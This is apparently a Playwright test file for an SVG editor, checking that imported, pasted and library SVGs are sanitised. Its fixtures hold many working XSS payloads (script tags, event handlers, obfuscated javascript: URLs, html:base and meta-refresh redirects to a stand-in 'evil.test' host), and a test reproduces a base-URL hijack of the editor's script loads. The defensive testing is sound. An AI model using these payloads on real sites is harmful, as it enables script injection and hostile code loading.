import { test, expect, load } from './fixtures.js';

// Imported SVG lands in the editor's own page, so it's an attack surface:
// a file must not run script, redirect the editor's own loads, fetch from
// elsewhere, or survive an undo (which re-reads the drawing as HTML) with
// anything dangerous. Every payload tries to set window.pwned.

const XHTML = 'http://www.w3.org/1999/xhtml';
const EVIL = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
    xmlns:html="${XHTML}" xmlns:m="http://www.w3.org/1998/Math/MathML"
    xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:dc="http://purl.org/dc/elements/1.1/"
    viewBox="0 0 200 200" onload="window.pwned=1">
  <?xml-stylesheet href="https://evil.test/s.css"?>
  <title>Hi <html:b>there</html:b><html:img src="x" onerror="window.pwned=2"/></title>
  <metadata><rdf:RDF><dc:title>Ok</dc:title><script>window.pwned=3</script><html:iframe src="https://evil.test/"/></rdf:RDF></metadata>
  <style>@import url(https://evil.test/i.css); .x { fill: url(https://evil.test/p.svg#p) } .y { fill: #00ff00 }</style>
  <script>window.pwned=4</script>
  <html:script>window.pwned=5</html:script>
  <html:base href="https://evil.test/"/>
  <html:meta http-equiv="refresh" content="0;url=https://evil.test/"/>
  <html:link rel="stylesheet" href="https://evil.test/l.css"/>
  <html:form action="javascript:window.pwned=6"><html:button>go</html:button></html:form>
  <m:math><m:mtext>x</m:mtext></m:math>
  <foreignObject width="10" height="10"><html:iframe src="javascript:parent.pwned=7"/></foreignObject>
  <a id="tab" href="java&#9;script:window.pwned=8"><rect width="10" height="10"/></a>
  <a id="ok" href="https://example.com/"><rect x="20" width="10" height="10"/></a>
  <use id="remote" href="https://evil.test/sprite.svg#icon"/>
  <use id="local" href="#keep"/>
  <image id="pix" href="https://evil.test/track.png" width="5" height="5"/>
  <image id="png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=" width="5" height="5"/>
  <rect id="paint" class="x sc-tip" width="10" height="10" style="stroke:url(https://evil.test/q#a);opacity:0.5" filter="url(https://evil.test/f#f)"/>
  <rect id="green" class="y" x="40" width="10" height="10"/>
  <rect id="anim" width="10" height="10"><set attributeName="onclick" to="window.pwned=9"/><animate attributeName="href" to="javascript:window.pwned=10"/></rect>
  <circle id="keep" r="5" onclick="window.pwned=11" onmouseover="window.pwned=12"/>
</svg>`;

// Everything left in the drawing, checked.
const audit = (page) =>
  page.evaluate((XHTML) => {
    const NS = 'http://www.w3.org/2000/svg';
    const els = [...document.querySelectorAll('#sc-doc *, #sc-defs *')];
    const bad = [];
    for (const el of els) {
      const inMeta = !!el.closest('metadata');
      if (!inMeta && el.namespaceURI !== NS) bad.push(`ns:${el.localName}`);
      if (el.namespaceURI === XHTML) bad.push(`html:${el.localName}`);
      if (['script', 'foreignObject', 'set', 'animate', 'style', 'iframe'].includes(el.localName))
        bad.push(`el:${el.localName}`);
      for (const a of el.attributes) {
        if (/^on/i.test(a.name)) bad.push(`on:${a.name}`);
        if (/url\((?!#)/i.test(a.value) && !a.name.startsWith('data-')) bad.push(`url:${a.value}`);
        if (/href$/.test(a.name) && !/^(#|data:image\/|https:\/\/example\.com)/.test(a.value))
          bad.push(`href:${a.value}`);
        if (a.name === 'class' && /sc-/.test(a.value)) bad.push(`class:${a.value}`);
      }
    }
    return {
      bad,
      pwned: window.pwned,
      base: document.baseURI.startsWith('file:'),
      titles: [...document.querySelectorAll('#sc-doc title, #sc-defs title')].map((t) => [
        t.textContent,
        t.children.length,
      ]),
    };
  }, XHTML);

const external = [];
test.beforeEach(async ({ page }) => {
  external.length = 0;
  page.on('request', (r) => r.url().includes('evil.test') && external.push(r.url()));
  await page.route(/evil\.test/, (r) => r.abort());
});

test('Open: nothing runs, nothing loads, and good content stays', async ({ page }) => {
  await page.evaluate((t) => window.svgcraft.openSvg(t, 'evil.svg'), EVIL);
  await page.waitForTimeout(300);
  const a = await audit(page);
  expect(a.bad).toEqual([]);
  expect(a.pwned).toBeUndefined();
  expect(a.base).toBe(true);
  expect(external).toEqual([]);
  // What's fine is kept: a web link, an in-file <use>, an image's data,
  // the CSS rule that was safe, and the text of the title.
  const kept = await page.evaluate(() => ({
    ok: document.getElementById('ok')?.getAttribute('href'),
    local: !!document.querySelector('#sc-doc use[href^="#"]'),
    png: document.querySelector('#sc-doc image[href^="data:image/png"]') !== null,
    green: document.getElementById('green')?.getAttribute('style'),
    opacity: document.getElementById('paint')?.getAttribute('style'),
    tab: document.getElementById('tab')?.hasAttribute('href'),
    remote: document.getElementById('remote')?.hasAttribute('href'),
    pix: document.getElementById('pix')?.hasAttribute('href'),
  }));
  expect(kept).toEqual({
    ok: 'https://example.com/',
    local: true,
    png: true,
    green: 'fill:rgb(0, 255, 0)',
    opacity: 'opacity:0.5',
    tab: false,
    remote: false,
    pix: false,
  });
  // Undo re-reads the drawing as HTML: still nothing.
  await page.evaluate(() => {
    document.getElementById('green').setAttribute('x', '60');
    window.svgcraft.commit();
    window.svgcraft.undo();
  });
  await page.waitForTimeout(200);
  const b = await audit(page);
  expect(b.bad).toEqual([]);
  expect(b.pwned).toBeUndefined();
  expect(b.titles.every(([, kids]) => kids === 0)).toBe(true);
  expect(external).toEqual([]);
});

test('Import (place) and paste are sanitised the same way', async ({ page }) => {
  await load(page, '<rect width="10" height="10"/>', 200, 200);
  await page.evaluate((t) => window.svgcraft.placeSvg(t, 'evil.svg'), EVIL);
  await page.waitForTimeout(300);
  const a = await audit(page);
  expect(a.bad).toEqual([]);
  expect(a.pwned).toBeUndefined();
  expect(a.base).toBe(true);
  expect(external).toEqual([]);
});

test('library tiles and symbols from a file are sanitised', async ({ page }) => {
  const lib = {
    patterns: [
      {
        name: 'Evil tile',
        w: 10,
        h: 10,
        svg: `<html:base xmlns:html="${XHTML}" href="https://evil.test/"/><rect width="5" height="5" fill="url(https://evil.test/x#y)" onclick="window.pwned=13"/><style>rect{fill:red}</style>`,
      },
    ],
    symbols: [
      {
        name: 'Evil symbol',
        w: 10,
        h: 10,
        svg: `<rect width="10" height="10"/><style>body{display:none}</style><a href=" javascript:window.pwned=14"><circle r="3"/></a>`,
      },
    ],
  };
  await page.setInputFiles('#sc-lib-file', {
    name: 'lib.json',
    mimeType: 'application/json',
    buffer: Buffer.from(JSON.stringify(lib)),
  });
  await expect(page.locator('#sc-msg')).toContainText('Imported');
  const stored = await page.evaluate(() => JSON.parse(localStorage.getItem('svgcraft.library.v1')));
  const tile = stored.patterns.find((p) => p.name === 'Evil tile').svg;
  const sym = stored.symbols.find((p) => p.name === 'Evil symbol').svg;
  for (const s of [tile, sym]) expect(s).not.toMatch(/base|evil\.test|onclick|<style|javascript/i);
  // The tile's red from its stylesheet is baked in; the page isn't restyled.
  expect(tile).toContain('fill');
  expect(await page.evaluate(() => getComputedStyle(document.body).display)).not.toBe('none');
  expect(await page.evaluate(() => document.baseURI.startsWith('file:'))).toBe(true);
});

// The attack that worked before the allowlist: an <html:base> nested in a
// group re-pointed the page's base URL, so the editor's next script load
// (the shape engine, on Combine Shapes) came from the attacker.
test('a nested <html:base> can’t redirect the editor’s own script loads', async ({ page }) => {
  await page.route(/evil\.test/, (r) =>
    r.fulfill({ body: 'window.pwned = "base";', contentType: 'text/javascript' }),
  );
  await page.evaluate(
    (x) =>
      window.svgcraft.openSvg(
        `<svg xmlns="http://www.w3.org/2000/svg" xmlns:html="${x}" viewBox="0 0 100 100"><g><html:base href="https://evil.test/"/></g><rect id="a" width="40" height="40"/><rect id="b" x="30" width="40" height="40"/></svg>`,
        'x.svg',
      ),
    XHTML,
  );
  expect(await page.evaluate(() => document.baseURI.startsWith('file:'))).toBe(true);
  await page.evaluate(() => {
    const s = window.svgcraft;
    s.setTool('select');
    s.state.sel = [document.getElementById('a'), document.getElementById('b')];
    s.syncActions();
  });
  await page.evaluate(() => document.querySelector('[data-action="combineUnite"]').click());
  await expect(page.locator('#sc-doc path')).toHaveCount(1);
  expect(external).toEqual([]);
  expect(await page.evaluate(() => window.pwned)).toBeUndefined();
});
